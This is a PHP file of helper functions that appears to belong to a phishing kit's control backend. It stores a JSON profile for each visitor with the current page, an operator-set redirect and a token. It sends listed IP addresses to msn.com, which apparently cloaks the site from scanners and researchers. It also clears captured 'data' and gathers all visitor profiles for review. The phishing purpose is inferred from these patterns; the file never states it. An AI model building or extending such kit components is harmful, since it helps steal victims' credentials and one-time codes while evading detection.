<?php

function get_client_ip() {
    global $user_ip;
    
    return $user_ip;
}

function check_restriction(){
    $jsonFile = 'restricted.json';

    if (!file_exists($jsonFile)) {
        die("JSON file not found!");
    }

    $jsonContent = file_get_contents($jsonFile);

    $restricted = json_decode($jsonContent, true);

    if (json_last_error() !== JSON_ERROR_NONE) {
        die("Error decoding JSON: " . json_last_error_msg());
    }
    
    if (in_array(get_client_ip(),$restricted))
        header("location:https://www.msn.com");
}

function update_current_page($user_profile,$data,$page){

    $data["current_page"] = $page;
    $data["update_time"] = date("Y-m-d H:i:s");
    
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
}


function update_redirect($user_profile,$to,$token=""){
    $jsonContent = file_get_contents($user_profile);
    
    $data = json_decode($jsonContent,true);
    
    $data["redirect"] = $to;
    $data["token"] = $token;

    $data["update_time"] = date("Y-m-d H:i:s");
    
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
}

function clear_data($user_profile){
    $jsonContent = file_get_contents($user_profile);
    
    $data = json_decode($jsonContent,true);
    
    $data["data"] = "";

    $data["update_time"] = date("Y-m-d H:i:s");
    
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
}

function redirect($user_profile,$data,$settings){
    
    $to = $data['redirect'];

    $path = '';

    foreach($settings['page'] as $page)
        if($page["name"] == $to)
            $path = $page["action"];
        
    $data['redirect'] = '';
    
    $data["update_time"] = date("Y-m-d H:i:s");
    
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
    header("location:./$path");   
}

function update($user_profile){
    if(!file_exists($user_profile))
        return;
    $jsonContent = file_get_contents($user_profile);
    
    $data = json_decode($jsonContent,true);

    $data["update_time"] = date("Y-m-d H:i:s");
    
    $jsonData = json_encode($data, JSON_PRETTY_PRINT);
    
    file_put_contents($user_profile, $jsonData);
}

function getUserData($files) {
    $users = [];
    foreach ($files as $file) {
        $userId = basename($file, '.json');
        
        $userData = json_decode(file_get_contents($file), true);
        
        if ($userData) {
            $users[$userId] = $userData;
        }
    }
    return $users;
}